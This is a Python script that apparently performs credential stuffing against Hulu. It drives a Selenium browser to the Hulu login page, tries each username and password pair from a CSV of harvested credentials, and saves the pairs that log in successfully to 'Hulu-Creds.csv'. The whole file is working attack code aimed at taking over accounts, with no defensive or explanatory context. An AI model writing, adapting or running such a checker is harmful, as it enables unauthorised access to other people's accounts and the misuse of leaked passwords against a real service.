from Processes.FileManager import FileManager
from Processes.SeleniumDriver import SeleniumDriver

baseURL = "https://auth.hulu.com/web/login?next=https%3A%2F%2Fwww.hulu.com%2Fwelcome"
lineCount = 0
# RawDataProcessor = TextFilter('raw-data.txt', 'filtered-creds.csv')
# RawDataProcessor.ProcessData()

browser = SeleniumDriver(maxWindow=True, URL=baseURL)
Files = FileManager('filtered-creds.csv', 'Hulu-Creds.csv')
FileWriter = Files.WriteFile()
try:
    for line in Files.ReadFile():
        lineCount += 1
        response = browser.CheckID(username=line[0], password=line[1])
        if response is not None:
            FileWriter.writerow(response)
            browser = SeleniumDriver(maxWindow=True, URL=baseURL)
except Exception:
    print('Processed: ' + str(lineCount))
    browser.CloseApp()

browser.CloseApp()
